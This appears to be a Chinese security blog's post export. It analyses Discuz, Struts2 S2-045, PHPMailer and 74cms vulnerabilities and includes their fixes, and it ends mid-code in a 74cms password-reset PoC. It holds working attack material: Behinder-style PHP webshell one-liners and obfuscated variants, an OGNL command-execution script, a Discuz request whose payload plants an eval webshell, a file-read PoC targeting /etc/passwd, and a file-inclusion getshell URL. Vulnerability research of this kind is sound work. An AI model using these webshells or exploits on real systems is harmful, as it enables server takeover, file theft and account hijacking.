[{"title":"冰蝎二进制菜刀记录","date":"2018-10-15T09:42:31.459Z","path":"冰蝎二进制菜刀变种一句话记录/","text":"冰蝎PHP马1234&lt;?php session_start(); isset($_GET['pass'])?print $_SESSION['k']=substr(md5(uniqid(rand())),16):($b=explode('|',openssl_decrypt(file_get_contents(\"php://input\"), \"AES128\", $_SESSION['k'])))&amp;@call_user_func($b[0],$b[1]);?&gt; 1.首先客户端以Get形式发起带密码的握手请求，服务端产生随机密钥并写入Session。2.客户端将源代码，如assert|eval(“phpinfo();”)利用AES加密，发送至服务端，服务端收到之后先进行AES解密，得到中间结果字符串assert|eval(“phpinfo();”)。3.服务端利用explode函数将拆分为一个字符串数据，索引为0的元素为字符串assert，索引为1的元素为字符串eval(“phpinfo();”)。4.以可变函数方式调用索引为0的数组元素，参数为索引为1的数组元素，即为assert(“eval(\\”phpinfo;\\”)”) 可根据冰蝎变种菜刀使用一句话openssl加密123456789&lt;?php if(@$_POST['1'])&#123;$key = \"123\";//$dd = @openssl_encrypt('assert|@eval(base64_decode($_POST[z0]));','AES-128-CBC',$key);$b=explode('|',openssl_decrypt('|gDOrwbzj8a+HsDmUMzfEal8e9fLpIuC/Ph7aTziCkg9Ci06I7Y7Sz4HVpTAHk+gc|', \"AES128\", $key));@call_user_func($b[0],$b[1]);&#125;?&gt; 修改菜刀header头为 1=1&amp;z0= base64加密1234&lt;?php $arrs = explode(\"|\", base64_decode(@$_POST['1'])); @call_user_func($arrs[0],$arrs[1]);?&gt; 修改菜刀header头为1=|YXNzZXJ0fEBldmFsKGJhc2U2NF9kZWNvZGUoJF9QT1NUW3owXSkpOw==|&amp;z0= 后续可根据各种加密变换","tags":[]},{"title":"README","date":"2018-06-06T17:01:01.000Z","path":"README/","text":"简述分析和收集各种CMS漏洞 Discuz discuz小于3.4.R20170929文件删除漏洞 discuz小于R20140619前台任意文件删除漏洞 discuz小于R20150609后台代码执行漏洞 phpcms PHPMailer PHPMailer小于5.2.21任意文件读取漏洞","tags":[{"name":"README","slug":"README","permalink":"https://firedebug.github.io/tags/README/"}]},{"title":"discuz&lt;3.4.R20170929文件删除漏洞","date":"2018-06-06T07:49:15.000Z","path":"PHP/discuz小于3.4.R20170929文件删除漏洞/","text":"漏洞版本Discuz！X &lt; 2.5.R20171001Discuz！X &lt; 3.4.R20170929 漏洞描述漏洞存在source\\include\\spacecp\\spacecp_profile.php中，$_FILES中包含未过滤的key值，控制space[‘key’]值可unlink任意文件。参考discuz小于R20140619前台任意文件删除漏洞 漏洞分析$_FILES接收上传文件，通过一系列init(),save(),get_image_info的安全过滤，控制key值unlink(space[$key]),此处space为用户个人资料数组。1234567891011121314151617if($_FILES) &#123; $upload = new discuz_upload(); ...... $upload-&gt;init($file, &apos;profile&apos;); $attach = $upload-&gt;attach; if(!$upload-&gt;error()) &#123; $upload-&gt;save(); if(!$upload-&gt;get_image_info($attach[&apos;target&apos;])) &#123; @unlink($attach[&apos;target&apos;]); continue; &#125; $setarr[$key] = &apos;&apos;; $attach[&apos;attachment&apos;] = dhtmlspecialchars(trim($attach[&apos;attachment&apos;])); ...... @unlink(getglobal(&apos;setting/attachdir&apos;).&apos;./profile/&apos;.$space[$key]); $setarr[$key] = $attach[&apos;attachment&apos;]; &#125; 漏洞利用 修改个人资料情感状态处值为../123.txt，此处目录为\\data\\attachment\\profile 查看元素修改情感状态type为file,并上传正常图片，保存即可删除指定文件。 漏洞修复 source\\include\\spacecp\\spacecp_profile.php123456789101112131415161718192021222324$upload-&gt;init($file, &apos;profile&apos;);$attach = $upload-&gt;attach;if(!$upload-&gt;error()) &#123; $upload-&gt;save(); if(!$upload-&gt;get_image_info($attach[&apos;target&apos;])) &#123; @unlink($attach[&apos;target&apos;]); continue; &#125; $setarr[$key] = &apos;&apos;; $attach[&apos;attachment&apos;] = dhtmlspecialchars(trim($attach[&apos;attachment&apos;])); if($vid &amp;&amp; $verifyconfig[&apos;available&apos;] &amp;&amp; isset($verifyconfig[&apos;field&apos;][$key])) &#123; if(isset($verifyinfo[&apos;field&apos;][$key])) &#123; $verifyarr[$key] = $attach[&apos;attachment&apos;]; &#125; continue; &#125; if(isset($setarr[$key]) &amp;&amp; $_G[&apos;cache&apos;][&apos;profilesetting&apos;][$key][&apos;needverify&apos;]) &#123; $verifyarr[$key] = $attach[&apos;attachment&apos;]; continue; &#125; $setarr[$key] = $attach[&apos;attachment&apos;];&#125; 23行unlink功能删除","tags":[{"name":"discuz","slug":"discuz","permalink":"https://firedebug.github.io/tags/discuz/"}]},{"title":"discuz&lt;R20140619前台任意文件删除漏洞","date":"2018-06-04T08:51:33.000Z","path":"PHP/discuz小于R20140619前台任意文件删除漏洞/","text":"漏洞版本&lt;= 2.5.R20140603&lt; 3.2.R20140618 漏洞描述漏洞存在source\\include\\spacecp\\spacecp_profile.php中，deletefile参数key值未过滤，导致通过控制key值可unlink任意文件。参考wooyun-2014-065513。 分析source\\include\\spacecp\\spacecp_profile.php文件中,GET方法获取deletefile的key值未做任何过滤，其中$space为用户资料数组，控制key值可删除任意文件，unlink目录为data\\attachment\\profile\\。123456789if($_GET[&apos;deletefile&apos;]) &#123; foreach($_GET[&apos;deletefile&apos;] as $key =&gt; $value) &#123; if(isset($_G[&apos;cache&apos;][&apos;profilesetting&apos;][$key]) ) &#123; @unlink(getglobal(&apos;setting/attachdir&apos;).&apos;./profile/&apos;.$space[$key]); @unlink(getglobal(&apos;setting/attachdir&apos;).&apos;./profile/&apos;.$verifyinfo[&apos;field&apos;][$key]); $verifyarr[$key] = $setarr[$key] = &apos;&apos;; &#125; &#125;&#125; 构造请求中source\\class\\helper\\helper_form.php中submitcheck会检查formhash参数1if($allowget || ($_SERVER[&apos;REQUEST_METHOD&apos;] == &apos;POST&apos; &amp;&amp; !empty($_GET[&apos;formhash&apos;]) &amp;&amp; $_GET[&apos;formhash&apos;] == formhash() &amp;&amp; empty($_SERVER[&apos;HTTP_X_FLASH_VERSION&apos;]) &amp;&amp; (empty($_SERVER[&apos;HTTP_REFERER&apos;]) || strncmp($_SERVER[&apos;HTTP_REFERER&apos;], &apos;http://wsq.discuz.qq.com&apos;, 24) === 0 || strncmp($_SERVER[&apos;HTTP_REFERER&apos;], &apos;http://m.wsq.qq.com&apos;, 19) === 0 || preg_replace(&quot;/https?:\\/\\/([^\\:\\/]+).*/i&quot;, &quot;\\\\1&quot;, $_SERVER[&apos;HTTP_REFERER&apos;]) == preg_replace(&quot;/([^\\:]+).*/&quot;, &quot;\\\\1&quot;, $_SERVER[&apos;HTTP_HOST&apos;])))) 漏洞利用 修改用户个人资料如情感状态为../123.txt; post请求包127.0.0.1/dz3.1/home.php?mod=spacecp&amp;ac=profile&amp;op=base&amp;deletefile[affectivestatus]=111data:formhash=286ffdbd&amp;profilesubmit=true可成功删除data\\attachment下123.txt文件。 漏洞修复source\\include\\spacecp\\spacecp_profile.php123456if($_GET[&apos;deletefile&apos;] &amp;&amp; is_array($_GET[&apos;deletefile&apos;])) &#123; foreach($_GET[&apos;deletefile&apos;] as $key =&gt; $value) &#123; if(isset($_G[&apos;cache&apos;][&apos;profilesetting&apos;][$key]) &amp;&amp; $_G[&apos;cache&apos;][&apos;profilesetting&apos;][$key][&apos;formtype&apos;] == &apos;file&apos;) &#123; @unlink(getglobal(&apos;setting/attachdir&apos;).&apos;./profile/&apos;.$space[$key]); @unlink(getglobal(&apos;setting/attachdir&apos;).&apos;./profile/&apos;.$verifyinfo[&apos;field&apos;][$key]); ...... 增加了[$key][‘formtype’] == ‘file’过滤，space都是非file类型。","tags":[{"name":"discuz","slug":"discuz","permalink":"https://firedebug.github.io/tags/discuz/"}]},{"title":"android","date":"2017-12-12T08:03:34.000Z","path":"android/android/","text":"判断Android是否为模拟器android.os.Build.BRAND:获取设备品牌ro.product.brnad:genericro.product.model:sdk C:\\Users\\dell&gt;adb shell getprop [ro.kernel.qemu]:[1] [ro.hardware]:[goldfish] [ro.build.tags]:[test-keys] [ro.product.model]:[sdk] [ro.product.brand]:[generic] [ro.product.name]:[sdk] [ro.product.device]:[generic] [ro.product.board]:[] [ro.product.manufacturer]: [unknown] [ro.board.platform]:[] [ro.build.product]:[generic]","tags":[{"name":"android","slug":"android","permalink":"https://firedebug.github.io/tags/android/"}]},{"title":"Strurs2远程命令执行漏洞（S2-045）","date":"2017-06-07T08:22:30.000Z","path":"JSP/Strurs2远程命令执行漏洞(S2-045)/","text":"漏洞说明 Struts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。 Struts2框架存在多个远程代码执行（S2-005、S2-009、S2-013、S2-016、S2-019、S2-020、S2-037、devmode），恶意攻击者可利用漏洞直接获取应用系统的Webshell，甚至获取操作系统以及数据库的权限。漏洞编号：S2-045CVE编号：CVE-2017-5638漏洞类型：远程代码执行漏洞级别：高危漏洞风险：黑客通过利用漏洞可以实现远程命令执行。影响版本：struts2.3.5 – struts2.3.31 , struts2.5 – struts2.5.10漏洞描述： 恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令。漏洞利用条件和方式： 黑客通过Jakarta 文件上传插件实现远程利用该漏洞执行代码。 1.基于Jakarta（Jakarta Multipart parser）插件的文件上传功能 2.恶意攻击者精心构造Content-Type的值 漏洞POC1python struts2.py http://gz.xx.cn/Index.action 1234567891011121314151617181920212223242526272829#! /usr/bin/env python# encoding:utf-8import urllib2import sysfrom poster.encode import multipart_encodefrom poster.streaminghttp import register_openersdef poc(): register_openers() datagen, header = multipart_encode(&#123;\"image1\": open(\"tmp.txt\", \"rb\")&#125;) header[\"User-Agent\"]=\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\" header[\"Content-Type\"]='''%&#123;(#nike='multipart/form-data'). (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS). (#_memberAccess?(#_memberAccess=#dm): ((#container=#context['com.opensymphony.xwork2.ActionContext.container']). (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)). (#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()). (#context.setMemberAccess(#dm)))).(#cmd='whoami'). (#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))). (#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)). (#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)). (#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse(). getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)). (#ros.flush())&#125;''' request = urllib2.Request(str(sys.argv[1]),datagen,headers=header) response = urllib2.urlopen(request) print response.read()poc() 漏洞修复检测方式查看web目录下/WEB-INF/lib/目录下的struts-core.x.x.jar ，如果这个版本在Struts2.3.5 到 Struts2.3.31 以及 Struts2.5 到 Struts2.5.10之间则存在漏洞，更行至Strusts2.3.32或者Strusts2.5.10.1，或使用第三方的防护设备进行防护。临时解决方案：删除commons-fileupload-x.x.x.jar文件（会造成上传功能不可用）。","tags":[{"name":"struts2","slug":"struts2","permalink":"https://firedebug.github.io/tags/struts2/"}]},{"title":"discuz小于R20150609后台代码执行漏洞","date":"2017-06-07T05:12:04.000Z","path":"PHP/discuz小于R20150609后台代码执行漏洞/","text":"测试版本&lt;3.2.R20150609&lt;3.1.R20141225&lt;3.0.R20150609&lt;2.5.R20141225 漏洞描述在检查用户名安全性时，含有未安全过滤的用户自定义正则表达式，通过/e执行代码。 漏洞分析这个问题的根源在于api/uc.php文件中的updatebadwords方法，代码如下：1234567891011121314151617181920212223242526function updatebadwords($get, $post) &#123; global $_G; if(!API_UPDATEBADWORDS) &#123; return API_RETURN_FORBIDDEN; &#125; $data = array(); if(is_array($post)) &#123; foreach($post as $k =&gt; $v) &#123; // if(substr($v['findpattern'], 0, 1) != '/' || substr($v['findpattern'], -3) != '/is') &#123; // $v['findpattern'] = '/' . preg_quote($v['findpattern'], '/') . '/is'; // &#125; $data['findpattern'][$k] = $v['findpattern']; $data['replace'][$k] = $v['replacement']; &#125; &#125; $cachefile = DISCUZ_ROOT.'./uc_client/data/cache/badwords.php'; $fp = fopen($cachefile, 'w'); $s = \"&lt;?php\\r\\n\"; $s .= '$_CACHE[\\'badwords\\'] = '.var_export($data, TRUE).\";\\r\\n\"; fwrite($fp, $s); fclose($fp); return API_RETURN_SUCCEED; &#125; 其中$post参数是可以自定义的xml内容，读取xml内容可以赋值findpattern和replace给$_CACHE[‘badwords’]，写入badwords文件。12include_once DISCUZ_ROOT.'./uc_client/lib/xml.class.php';$post = xml_unserialize(file_get_contents('php://input')); xml格式如下定义，见/uc_client/lib/xml.class.php追溯$_CACHE[‘badwords’]，发现pm.php和user.php调用，见uc_server\\model\\user.phpuc_server\\control\\user.php调用check_usernamecensor函数1234567891011function _check_username($username) &#123; $username = addslashes(trim(stripslashes($username))); if(!$_ENV['user']-&gt;check_username($username)) &#123; return UC_USER_CHECK_USERNAME_FAILED; &#125; elseif(!$_ENV['user']-&gt;check_usernamecensor($username)) &#123; return UC_USER_USERNAME_BADWORD; &#125; elseif($_ENV['user']-&gt;check_usernameexists($username)) &#123; return UC_USER_USERNAME_EXISTS; &#125; return 1; &#125; uc_server\\control\\user.php onregister函数调用_check_username，即用户名注册处 漏洞POC1.首先获取后台账号密码2.在站长-&gt;UC设置处获取UC_KEY,修改本地uc.php,代码如下123$a = 'time='.time().'&amp;action=updatebadwords'; $code = authcode($a, 'ENCODE', 'UC_KEY'); echo $code;exit; //0ec8dgUQLu4mW3ECCTjNWV2olxsYlQa4AR/auHtetfhsjxcp2fOL5JAkwSx1SMdpMoYcKWsuPUJEs9Qkzm9e14Le 3.请求获取加密后code值，然后用post方法向api/uc.php发送带有正则表达式的xml数据包,刚才获取的code需要进行一次url编码，否则解密会出现问题。数据包如下图所示：1234567891011121314151617181920POST /dz3.0/api/uc.php?code=0ec8dgUQLu4mW3ECCTjNWV2olxsYlQa4AR/auHtetfhsjxcp2fOL5JAkwSx1SMdpMoYcKWsuPUJEs9Qkzm9e14Le HTTP/1.1Host: 192.168.20.89Proxy-Connection: keep-aliveContent-Length: 194Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://192.168.20.89User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2415.0 Safari/537.36Content-Type: text/xmlReferer: http://192.168.120.89/dz3.0/admin.php?action=setting&amp;operation=ucAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8,en;q=0.6&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;&lt;root&gt; &lt;item id=\"balabala\"&gt; &lt;item id=\"findpattern\"&gt;/.*/e&lt;/item&gt; &lt;item id=\"replacement\"&gt;phpinfo();&lt;/item&gt; &lt;/item&gt;&lt;/root&gt; 1//写文件：&lt;item id=\"replacement\"&gt;fwrite(fopen(\"test.php\",\"a+\"),\"&amp;lt;?php @eval(\\$_POST['a']);//?&gt;\");&lt;/item&gt; 此时uc_client\\data\\cache\\badwords.php文件生成4.增加用户触发漏洞 漏洞修复官方补丁api/uc.php","tags":[{"name":"discuz","slug":"discuz","permalink":"https://firedebug.github.io/tags/discuz/"}]},{"title":"PHPMailer小于5.2.21任意文件读取漏洞","date":"2017-06-07T04:43:56.000Z","path":"PHP/PHPMailer小于5.2.21任意文件读取漏洞/","text":"漏洞版本： &lt;= 5.2.21CVE: CVE-2017-5223 漏洞分析$path变量未过滤，导致可以file_get_contents该函数中接收了一个 $path 变量，最后该 $path 变量的值带入到了 file_get_contents 函数中执行。如果该$path变量可控即可任意文件读取：1234567891011121314151617181920212223242526272829303132protected function encodeFile($path, $encoding = 'base64')&#123; try &#123; if (!is_readable($path)) &#123; throw new phpmailerException($this-&gt;lang('file_open') . $path, self::STOP_CONTINUE); &#125; $magic_quotes = get_magic_quotes_runtime(); if ($magic_quotes) &#123; if (version_compare(PHP_VERSION, '5.3.0', '&lt;')) &#123; set_magic_quotes_runtime(false); &#125; else &#123; //Doesn't exist in PHP 5.4, but we don't need to check because //get_magic_quotes_runtime always returns false in 5.4+ //so it will never get here ini_set('magic_quotes_runtime', false); &#125; &#125; $file_buffer = file_get_contents($path); $file_buffer = $this-&gt;encodeString($file_buffer, $encoding); if ($magic_quotes) &#123; if (version_compare(PHP_VERSION, '5.3.0', '&lt;')) &#123; set_magic_quotes_runtime($magic_quotes); &#125; else &#123; ini_set('magic_quotes_runtime', $magic_quotes); &#125; &#125; return $file_buffer; &#125; catch (Exception $exc) &#123; $this-&gt;setError($exc-&gt;getMessage()); return ''; &#125;&#125; 回溯发现attachAll函数调用encodeFile1234567891011121314151617181920protected function attachAll($disposition_type, $boundary)&#123; // Return text of body $mime = array(); $cidUniq = array(); $incl = array(); // Add all attachments foreach ($this-&gt;attachment as $attachment) &#123; // Check if it is a valid disposition_filter if ($attachment[6] == $disposition_type) &#123; // Check for string attachment $string = ''; $path = ''; $bString = $attachment[5]; if ($bString) &#123; $string = $attachment[0]; &#125; else &#123; $path = $attachment[0]; &#125; $path变量是通过$attachment[0]赋值，追踪$attachment数组发现addAttachment和addStringAttachment、addEmbeddedImage、addStringEmbeddedImage生成数组。123456789101112131415161718192021222324252627282930public function addEmbeddedImage($path, $cid, $name = '', $encoding = 'base64', $type = '', $disposition = 'inline')&#123; if (!@is_file($path)) &#123; $this-&gt;setError($this-&gt;lang('file_access') . $path); return false; &#125; // If a MIME type is not specified, try to work it out from the file name if ($type == '') &#123; $type = self::filenameToType($path); &#125; $filename = basename($path); if ($name == '') &#123; $name = $filename; &#125; // Append to $attachment array $this-&gt;attachment[] = array( 0 =&gt; $path, 1 =&gt; $filename, 2 =&gt; $name, 3 =&gt; $encoding, 4 =&gt; $type, 5 =&gt; false, // isStringAttachment 6 =&gt; $disposition, 7 =&gt; $cid ); return true;&#125; 其中addEmbeddedImage该函数是处理邮件内容中的图片的，回溯该函数发现msgHTML调用，msgHTML 函数是用来发送html格式的邮件，其中$filename由$url赋值$url由$images[2]数组赋值，$url 是通过解析$message里src=”xxxxx”而来的，$url最终被解析出来就是xxxxx$image由$message赋值，而 $message 就是我们发送邮件的自定义的内容。这样可控点就找到了，即可成功利用该漏洞了。回溯attachAll函数被createBody()调用，createBody()赋值给$MIMEBody$MIMEBody被postSend函数和preSend函数调用用send方法即可调用该函数，即发信指令 漏洞利用1234567891011121314151617181920212223242526272829&lt;?php #Author:Yxlinkrequire_once('PHPMailerAutoload.php');//require_once('class.phpmailer5.2.14.php');//require_once('class.phpmailer5.22.php');$mail = new PHPMailer();$mail-&gt;IsSMTP();$mail-&gt;Host = \"smtp.163.com\";$mail-&gt;Port = 25;$mail-&gt;SMTPAuth = true;$mail-&gt;CharSet = \"UTF-8\";$mail-&gt;Encoding = \"base64\"; $mail-&gt;Username = \"xxx@163.com\"; $mail-&gt;Password = \"xxxx\"; $mail-&gt;Subject = \"hello\"; $mail-&gt;From = \"xxx@163.com\"; $mail-&gt;FromName = \"test\"; $address = \"xxx@163.com\";$mail-&gt;AddAddress($address, \"test\"); //$mail-&gt;AddAttachment('test.txt','test.txt'); //test.txt可控即可任意文件读取 $mail-&gt;IsHTML(true); $msg=\"&lt;img src='/etc/passwd'&gt;test\";//邮件内容形如这样写。$mail-&gt;msgHTML($msg); if(!$mail-&gt;Send()) &#123; echo \"Mailer Error: \" . $mail-&gt;ErrorInfo;&#125; else &#123; echo \"Message sent!\";&#125;?&gt; 漏洞测试在linux中测试，使用poc利用可读取发送邮件服务器文件内容","tags":[{"name":"phpmailer","slug":"phpmailer","permalink":"https://firedebug.github.io/tags/phpmailer/"}]},{"title":"74cms前台Getshell","date":"2017-06-07T03:50:11.000Z","path":"PHP/74cms前台Getshell/","text":"测试版本： 74cms_v4.1.23 74cms前台存在文件包含漏洞，可利用漏洞Getshell调用thinkphp框架，将$type传入display函数，display是thinkphp中模板展示函数，74cms\\Application\\Home\\Controller\\MController.class.php文件123456789101112131415161718public function index()&#123; if(!I('get.org','','trim') &amp;&amp; C('PLATFORM') == 'mobile' &amp;&amp; $this-&gt;apply['Mobile'])&#123; redirect(build_mobile_url()); &#125; $type = I('get.type','android','trim'); //echo (__FILE__); $android_download_url = C('qscms_android_download')?C('qscms_android_download'):''; $ios_download_url = C('qscms_ios_download')?C('qscms_ios_download'):''; $this-&gt;assign('android_download_url',$android_download_url); $this-&gt;assign('ios_download_url',$ios_download_url); $this-&gt;assign('type',$type);//M/../data/upload/resume_img/1703/01/58b66934b74c8.jpg $this-&gt;display('M/'.$type);&#125;&#125; 追踪display函数，74cms\\Application\\Common\\Controller\\FrontendController.class.php12345678910111213protected function display($tpl)&#123; if(!$this-&gt;get('page_seo'))&#123; $page_seo = D('Page')-&gt;get_page(); $this-&gt;_config_seo($page_seo[strtolower(MODULE_NAME).'_'.strtolower(CONTROLLER_NAME).'_'.strtolower(ACTION_NAME)],I('request.')); &#125; parent::display($tpl); if($this-&gt;visitor-&gt;is_login &amp;&amp; !IS_AJAX &amp;&amp; IS_GET)&#123; $this-&gt;apply['Analyze'] &amp;&amp; $this-&gt;record_route(); &#125; &#125; 74cms\\data\\Runtime\\common~runtime.php文件中display函数1234protected function display($templateFile='',$charset='',$contentType='',$content='',$prefix='') &#123; $this-&gt;view-display($templateFile,$charset,$contentType,$content,$prefix); &#125; 调用view类display函数，dispaly加载模板和页面输出，可以返回输出内容123456789101112public function display($templateFile='',$charset='',$contentType='',$content='',$prefix='') &#123; G('viewStartTime'); // 视图开始标签 Hook::listen('view_begin',$templateFile); // 解析并获取模板内容 $content = $this-&gt;fetch($templateFile,$content,$prefix); // 输出模板内容 $this-&gt;render($content,$charset,$contentType); // 视图结束标签 Hook::listen('view_end'); &#125; 追踪fetch函数，解析和获取模板内容 用于输出，可以发现已经include $templateFile1234567891011121314151617181920212223242526272829public function fetch($templateFile='',$content='',$prefix='') &#123; if(empty($content)) &#123; $templateFile = $this-&gt;parseTemplate($templateFile); // 模板文件不存在直接返回 if(!is_file($templateFile)) E(L('_TEMPLATE_NOT_EXIST_').':'.$templateFile); &#125;else&#123; defined('THEME_PATH') or define('THEME_PATH', $this-&gt;getThemePath()); &#125; // 页面缓存 ob_start(); ob_implicit_flush(0); if('php' == strtolower(C('TMPL_ENGINE_TYPE'))) &#123; // 使用PHP原生模板 $_content = $content; // 模板阵列变量分解成为独立变量 extract($this-&gt;tVar, EXTR_OVERWRITE); // 直接载入PHP模板 empty($_content)?include $templateFile:eval('?&gt;'.$_content); &#125;else&#123; // 视图解析标签 $params = array('var'=&gt;$this-&gt;tVar,'file'=&gt;$templateFile,'content'=&gt;$content,'prefix'=&gt;$prefix); Hook::listen('view_parse',$params); &#125; // 获取并清空缓存 $content = ob_get_clean(); // 内容过滤标签 Hook::listen('view_filter',$content); // 输出模板文件 return $content; &#125; 调用render函数输出文件12345678910private function render($content,$charset='',$contentType='')&#123; if(empty($charset)) $charset = C('DEFAULT_CHARSET'); if(empty($contentType)) $contentType = C('TMPL_CONTENT_TYPE'); // 网页字符编码 header('Content-Type:'.$contentType.'; charset='.$charset); header('Cache-control: '.C('HTTP_CACHE_CONTROL')); // 页面缓存控制 header('X-Powered-By:QSCMS'); // 输出模板文件 echo $content; &#125; 漏洞利用前台注册账号，会员中心，修改简历上传文件，如图片，获取包含恶意脚本的图片地址，利用文件包含执行，访问包含文件执行phphttp://127.0.0.1/74cms/index.php?m=&amp;c=M&amp;a=index&amp;type=../data/upload/resume_img/1703/01/58b66934b74c8.jpg","tags":[{"name":"74cms","slug":"74cms","permalink":"https://firedebug.github.io/tags/74cms/"}]},{"title":"74cms任意用户密码修改","date":"2017-06-07T03:27:21.000Z","path":"PHP/74cms任意用户密码修改/","text":"测试版本： 74cms_v4.1.23 加密解密key=’_qscms’，固定密钥可逆。74cms\\Application\\Home\\Controller\\MembersController.class.php文件中user_setpass函数12345678910111213141516171819202122232425262728293031public function user_setpass()&#123; if(IS_POST)&#123; $retrievePassword = session('retrievePassword'); if($retrievePassword['token'] != I('post.token','','trim')) $this-&gt;error('非法参数！'); $user['password']=I('post.password','','trim,badword'); !$user['password'] &amp;&amp; $this-&gt;error('请输入新密码！'); if($user['password'] != I('post.password1','','trim,badword')) $this-&gt;error('两次输入密码不相同，请重新输入！'); $passport = $this-&gt;_user_server(); if(false === $uid = $passport-&gt;edit($retrievePassword['uid'],$user)) $this-&gt;error($passport-&gt;get_error()); $tpl = 'user_setpass_sucess'; session('retrievePassword',null); &#125;else&#123; parse_str(decrypt(I('get.key','','trim')),$data); //exit(var_dump($data)); //array (size=3) // 'e' =&gt; string 'test123@test.com' (length=16) // 'k' =&gt; string '13b4c66feebfd64a' (length=16) // 't' =&gt; string '9487070991' (length=10) !fieldRegex($data['e'],'email') &amp;&amp; $this-&gt;error('找回密码失败,邮箱格式错误！','user_getpass'); $end_time=$data['t']+24*3600; if($end_time&lt;time()) $this-&gt;error('找回密码失败,链接过期!','user_getpass'); $key_str=substr(md5($data['e'].$data['t']),8,16); //exit($var_dump($key_str)); if($key_str!=$data['k']) $this-&gt;error('找回密码失败,key错误!','user_getpass'); if(!$uid = M('Members')-&gt;where(array('email'=&gt;$data['e']))-&gt;getfield('uid')) $this-&gt;error('找回密码失败,帐号不存在!','user_getpass'); $token=substr(md5(mt_rand(100000, 999999)), 8,16); session('retrievePassword',array('uid'=&gt;$uid,'token'=&gt;$token)); $this-&gt;assign('token',$token); &#125; $this-&gt;_config_seo(array('title'=&gt;'找回密码 - '.C('qscms_site_name'))); $this-&gt;display($tpl); &#125; 74cms\\Application\\Common\\Common\\function.php中查看解密函数decrypt()123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869function encrypt($txt, $key = '_qscms') &#123; // 使用随机数发生器产生 0~32000 的值并 MD5() srand((double)microtime() * 1000000); $encrypt_key = md5(rand(0, 32000)); // 变量初始化 $ctr = 0; $tmp = ''; // for 循环，$i 为从 0 开始，到小于 $txt 字串长度的整数 for($i = 0; $i &lt; strlen($txt); $i++) &#123; // 如果 $ctr = $encrypt_key 的长度，则 $ctr 清零 $ctr = $ctr == strlen($encrypt_key) ? 0 : $ctr; // $tmp 字串在末尾增加两位，其第一位内容为 $encrypt_key 的第 $ctr 位， // 第二位内容为 $txt 的第 $i 位与 $encrypt_key 的 $ctr 位取异或。然后 $ctr = $ctr + 1 $tmp .= $encrypt_key[$ctr].($txt[$i] ^ $encrypt_key[$ctr++]); &#125; // 返回结果，结果为 passport_key() 函数返回值的 base64 编码结果 return base64_encode(passport_key($tmp, $key));&#125;/** * Passport 解密函数 * * @param string 加密后的字串 * @param string 私有密匙(用于解密和加密) * * @return string 字串经过私有密匙解密后的结果 */ //key=AGUGOwJ0AmxSKgZ2VmRcNAdnACNTMQRnViJQZQ50XXgCLARnBWhVM1Z7CmUFO141A2MLbwBiBTUGMARiWjUFMQBlBmQCZgJtUm8GNlY0XCAHIAA7UzwEY1ZuUDcON107AjIEPQU%2BVW8%3D //key=AGUGOwJ0AmxSKgZ2VmRcNAdnACNTMQRnViJQZQ50XXgCLARnBWhVM1Z7CmUFO141A2MLbwBiBTUGMARiWjUFMQBlBmQCZgJtUm8GNlY0XCAHIAA7UzwEY1ZuUDcON107AjIEPQU+VW8=function decrypt($txt, $key = '_qscms') &#123; // $txt 的结果为加密后的字串经过 base64 解码，然后与私有密匙一起， // 经过 passport_key() 函数处理后的返回值 $txt = passport_key(base64_decode($txt), $key); // 变量初始化 $tmp = ''; // for 循环，$i 为从 0 开始，到小于 $txt 字串长度的整数 for ($i = 0; $i &lt; strlen($txt); $i++) &#123; // $tmp 字串在末尾增加一位，其内容为 $txt 的第 $i 位， // 与 $txt 的第 $i + 1 位取异或。然后 $i = $i + 1 $tmp .= $txt[$i] ^ $txt[++$i]; &#125; // 返回 $tmp 的值作为结果 return $tmp;&#125;/** * Passport 密匙处理函数 * * @param string 待加密或待解密的字串 * @param string 私有密匙(用于解密和加密) * * @return string 处理后的密匙 */function passport_key($txt, $encrypt_key) &#123; // 将 $encrypt_key 赋为 $encrypt_key 经 md5() 后的值 $encrypt_key = md5($encrypt_key); // 变量初始化 $ctr = 0; $tmp = ''; // for 循环，$i 为从 0 开始，到小于 $txt 字串长度的整数 for($i = 0; $i &lt; strlen($txt); $i++) &#123; // 如果 $ctr = $encrypt_key 的长度，则 $ctr 清零 $ctr = $ctr == strlen($encrypt_key) ? 0 : $ctr; // $tmp 字串在末尾增加一位，其内容为 $txt 的第 $i 位， // 与 $encrypt_key 的第 $ctr + 1 位取异或。然后 $ctr = $ctr + 1 $tmp .= $txt[$i] ^ $encrypt_key[$ctr++]; &#125; // 返回 $tmp 的值作为结果 return $tmp;&#125; 加密解密密钥’_qscms’，存在任意用户密码修改漏洞。 漏洞POC12345678910111213141516171819202122232425262728&lt;?phpfunction encrypt($txt, $key = '_qscms') &#123; srand((double)microtime() * 1000000); $encrypt_key = md5(rand(0, 32000)); $ctr = 0; $tmp = ''; for($i = 0; $i &lt; strlen($txt); $i++) &#123; $ctr = $ctr == strlen($encrypt_key) ? 0 : $ctr; $tmp .= $encrypt_key[$ctr].($txt[$i] ^ $encrypt_key[$ctr++]); &#125; return base64_encode(passport_key($tmp, $key));&#125;function passport_key($txt, $encrypt_key) &#123; $encrypt_key = md5($encrypt_key); $ctr = 0; $tmp = ''; for($i = 0; $i &lt; strlen($txt); $i++) &#123; $ctr = $ctr == 